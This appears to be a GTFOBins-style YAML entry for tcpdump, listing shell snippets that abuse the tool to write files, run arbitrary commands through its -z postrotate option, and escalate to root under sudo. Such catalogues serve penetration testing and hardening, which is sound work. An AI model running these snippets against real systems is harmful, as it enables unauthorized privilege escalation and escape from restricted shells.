---
description: |
  These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

  In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.
functions:
  file-write:
    - description: It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
      code: |
        LFILE=file_to_write
        USER=output_file_owner
        tcpdump -ln -i lo -w $LFILE -c 1 -Z $USER
  command:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
  sudo:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
---
